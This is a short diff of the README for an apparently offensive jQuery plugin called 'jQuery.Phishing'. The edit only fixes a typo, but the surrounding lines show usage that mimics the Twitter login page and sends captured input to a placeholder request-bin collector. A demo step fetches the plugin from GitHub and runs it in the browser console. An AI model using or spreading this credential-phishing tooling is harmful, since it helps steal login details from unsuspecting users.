@@ -9,7 +9,7 @@ $.phishing('https://twitter.com/login','//your_request_bin')
 $.phishing('https://twitter.com/login',()=>alert`onload`)
 ```
 ## Demo
-1. Open you website
+1. Open your website
 2. F12 call dev-tool -> console -> input:
 ```javascript
 $.get(`https://raw.githubusercontent.com/jackmasa/jQuery.Phishing/master/jQuery.Phishing.js`,c=>{
